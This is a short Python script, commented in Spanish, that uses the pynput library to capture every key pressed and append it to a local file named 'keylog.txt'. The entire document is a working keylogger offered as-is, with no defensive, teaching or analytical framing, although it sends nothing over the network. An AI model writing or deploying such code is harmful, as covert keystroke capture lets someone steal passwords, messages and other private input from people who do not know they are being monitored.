from pynput import keyboard

# Archivo donde se guardarán las pulsaciones
log_file = "keylog.txt"

# Función que almacena las teclas presionadas
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f'{key.char}')
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f'[{key}]')

# Listener para capturar las teclas
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

